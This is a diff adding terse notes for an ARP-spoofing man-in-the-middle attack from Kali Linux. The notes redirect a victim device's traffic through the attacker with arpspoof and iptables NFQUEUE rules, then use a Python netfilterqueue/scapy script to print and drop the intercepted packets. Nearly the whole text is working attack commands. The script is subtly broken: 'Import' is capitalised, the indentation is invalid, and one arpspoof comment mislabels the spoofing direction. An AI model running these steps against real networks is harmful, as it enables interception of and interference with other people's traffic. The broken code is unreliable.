@@ -1,0 +1,42 @@
+(capturing packets from android phone or any pc)
+(kali)
+(kali : we can create a queue to capture packet and not send to destination)
+#iptables -I FORWARD -j NFQUEUE --queue-num 0 (put packets in FORWARD  chain to default NFqueue)
+#iptables -I OUTPUT -j NFQUEUE --queue-num 0 (trap outgoing packet)
+#iptables -I INPUT -j NFQUEUE --queue-num 0 (trap incoming packet)
+
+#apt-get update (for dsniff package)
+#apt-get install dsniff (for arpspoof)
+#arp -a (get ARP table)
+#echo 1 > /proc/sys/net/ipv4/ip_forward (allows kali to pass packets)
+(terminal-1)
+#arpspoof -i wlan0 -t 192.168.1.5 192.168.1.1  (telling 1.5 that we are 1.1)
+(terminal-2)
+#arpspoof -i wlan0 -t 192.168.1.1 192.168.1.5  (telling 1.5 that we are 1.1)
+
+(kali)
+#apt-get install build-essential python3-dev libnetfilter-queue-dev
+#apt install python3.12-venv -y
+#python3 -m venv myenv
+#source myenv/bin/activate
+#python3 -m pip install --upgrade pip
+# pip3 install netfilterqueue
+#vim index.py 
+#!/usr/bin/env python
+
+import netfilterqueue
+Import scapy.all as scapy
+
+def process_packet(packet) :
+scapy_packet = scapy.IP(packet.get_payload())
+print(scapy_packet.show())
+    print(packet.get_payload())
+    packet.drop()    # or packet.accept()
+    return 0
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
+
+# chmod 777 index.py
+#./index.py
